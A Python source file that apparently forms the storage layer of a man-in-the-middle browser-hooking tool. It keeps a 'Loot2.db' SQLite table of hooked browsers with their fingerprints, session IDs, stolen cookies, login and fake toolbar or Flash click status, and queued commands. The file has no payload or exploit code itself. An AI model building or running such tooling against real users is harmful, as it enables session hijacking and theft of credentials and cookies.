import mitmproxy, sqlite3, os, base64, sys, random, string

class Browser_DB_Router:

	def __init__(self, uid):
		self.dbName = "Loot2.db"
		self.connex = sqlite3.connect(self.dbName)
		self.connex.text_factory = str
		self.cur = self.connex.cursor()
		self.current_user = uid
		self.initTable()

	def initTable(self):
		try:
			self.cur.execute('CREATE TABLE IF NOT EXISTS BrowserTable' \
					'(user_id TEXT NOT NULL,' \
					'hooked_browser_id TEXT UNIQUE NOT NULL,' \
					'browser_name TEXT NOT NULL,' \
					'browser_version TEXT NOT NULL,' \
					'os TEXT NOT NULL,' \
					'os_version TEXT NOT NULL,' \
					'browser_plugins TEXT NOT NULL,'\
					'session_id TEXT NOT NULL,'\
					'has_logged_in INTEGER NOT NULL,'\
					'has_clicked_toolbar INTEGER NOT NULL,'\
					'has_clicked_flash INTEGER NOT NULL,'\
					'redirect_uri TEXT NOT NULL,'\
					'recent_login_cmd TEXT NOT NULL,'\
					'recent_toolbar_cmd TEXT NOT NULL,'\
					'recent_flash_cmd TEXT NOT NULL,'\
					'has_activex_enabled TEXT NOT NULL,' \
					'has_VBS_enabled TEXT NOT NULL,' \
					'has_flash_enabled TEXT NOT NULL,'\
					'has_quicktime_enabled TEXT NOT NULL,' \
					'cookies TEXT NOT NULL)')
			self.connex.commit()
		except sqlite3.Error as SQE:
			print("error initting table:", SQE)
			pass


	def show_browser_db(self, user_id):
		try:
			self.cur.execute('SELECT * FROM BrowserTable WHERE user_id = ?',[user_id]) 
			table = self.cur.fetchall()
			self.connex.commit()
			for row in table:
				for ro in row:
					print ro
		except UnicodeEncodeError:
			print("error printing DB")
			pass
		except sqlite3.OperationalError as SQE:
			print("error selecting from local db", SQE)
			pass


	def insert_into_BrowserTable(self, 
		user_id, hooked_browser_id, browser_name, 
		browser_version, os, os_version, browser_plugins, session_id,  
		redirect_uri,login_cmd, toolbar_cmd, flash_cmd, has_activex_enabled,
		has_VBS_enabled,has_flash_enabled, has_quicktime_enabled, cookies):
		try:
			print("adding to browser table...")
			self.cur.execute("INSERT or IGNORE INTO BrowserTable VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)", [user_id, hooked_browser_id, browser_name, browser_version, os, str(os_version), browser_plugins, session_id, 0,0, 0, redirect_uri, login_cmd, toolbar_cmd, flash_cmd, has_activex_enabled, has_VBS_enabled,has_flash_enabled, has_quicktime_enabled, cookies])
			self.connex.commit()
			print("successfully inserted records into browser table...")
		except sqlite3.Error as SQE:
			print("error inserting record:", SQE)
			pass

	def update_BrowserTable_Login(self, user_id, did_login):
		try:
			print("adding to browser table...")
			self.cur.execute("UPDATE BrowserTable SET has_logged_in = ? WHERE user_id = ?", [did_login,user_id])
			self.connex.commit()
			print("successfully inserted records into browser table...")
		except sqlite3.Error as SQE:
			print("error inserting record:", SQE)
			pass


	def update_BrowserTable_Toolbar(self, user_id, did_toolbar):
		try:
			print("adding to browser table...")
			self.cur.execute("UPDATE BrowserTable SET has_clicked_toolbar = ? WHERE user_id = ?", [did_toolbar,user_id])
			self.connex.commit()
			print("successfully inserted records into browser table...")
		except sqlite3.Error as SQE:
			print("error inserting record:", SQE)
			pass

	def update_BrowserTable_Flash(self, user_id, did_toolbar):
		try:
			print("adding to browser table...")
			self.cur.execute("UPDATE BrowserTable SET has_clicked_flash = ? WHERE user_id = ?", [did_toolbar,user_id])
			self.connex.commit()
			print("successfully inserted records into browser table...")
		except sqlite3.Error as SQE:
			print("error inserting record:", SQE)
			pass

	def update_BrowserTable_Session_id(self, user_id, session_id, redirect_uri):
		try:
			print("adding to browser table...")
			self.cur.execute("UPDATE BrowserTable SET session_id = ?, redirect_uri=? WHERE user_id = ?", [session_id, redirect_uri, user_id])
			self.connex.commit()
			print("successfully inserted records into browser table...")
		except sqlite3.Error as SQE:
			print("error inserting record:", SQE)
			pass

	def update_BrowserTable_Login_Cmd(self, user_id, login_cmd):
		try:
			print("adding to browser table...")
			self.cur.execute("UPDATE BrowserTable SET recent_login_cmd = ? WHERE user_id = ?", [login_cmd, user_id])
			self.connex.commit()
			print("successfully inserted records into browser table...")
		except sqlite3.Error as SQE:
			print("error inserting record:", SQE)
			pass

	def update_BrowserTable_Toolbar_Cmd(self, user_id, toolbar_cmd):
		try:
			print("adding to browser table...")
			self.cur.execute("UPDATE BrowserTable SET recent_toolbar_cmd = ? WHERE user_id = ?", [toolbar_cmd, user_id])
			self.connex.commit()
			print("successfully inserted records into browser table...")
		except sqlite3.Error as SQE:
			print("error inserting record:", SQE)
			pass

	def update_BrowserTable_Flash_Cmd(self, user_id, flash_cmd):
		try:
			print "updating flash cmd"
			self.cur.execute("UPDATE BrowserTable SET recent_flash_cmd = ? WHERE user_id = ?", [flash_cmd, user_id])
			self.connex.commit()
			print("successfully inserted records into browser table...")
		except sqlite3.Error as SQE:
			print("error inserting record:", SQE)
			pass

	def get_browser_session_id(self, user_id):
		try:
			print("retrieving from table...")
			sesh_id = self.cur.execute("SELECT session_id FROM BrowserTable WHERE user_id = ?", [user_id])
			self.connex.commit()
			return str(self.cur.fetchone()[0])
		except sqlite3.Error as SQE:
			print("error finding record:", SQE)
			pass


	def get_browser_toolbar_cmd(self, user_id):
		try:
			print("retrieving from table...")
			toolbar_id = self.cur.execute("SELECT recent_toolbar_cmd FROM BrowserTable WHERE user_id = ?", [user_id])
			self.connex.commit()
			return str(self.cur.fetchone()[0])
		except sqlite3.Error as SQE:
			print("error finding record:", SQE)
			pass

	def get_browser_flash_cmd(self, user_id):
		try:
			print("retrieving from table...")
			toolbar_id = self.cur.execute("SELECT recent_flash_cmd FROM BrowserTable WHERE user_id = ?", [user_id])
			self.connex.commit()
			return str(self.cur.fetchone()[0])
		except sqlite3.Error as SQE:
			print("error finding record:", SQE)
			pass		

	def get_browser_login_cmd(self, user_id):
		try:
			print("retrieving from table...")
			login_id = self.cur.execute("SELECT recent_login_cmd FROM BrowserTable WHERE user_id = ?", [user_id])
			self.connex.commit()
			return str(self.cur.fetchone()[0])
		except sqlite3.Error as SQE:
			print("error finding record:", SQE)
			pass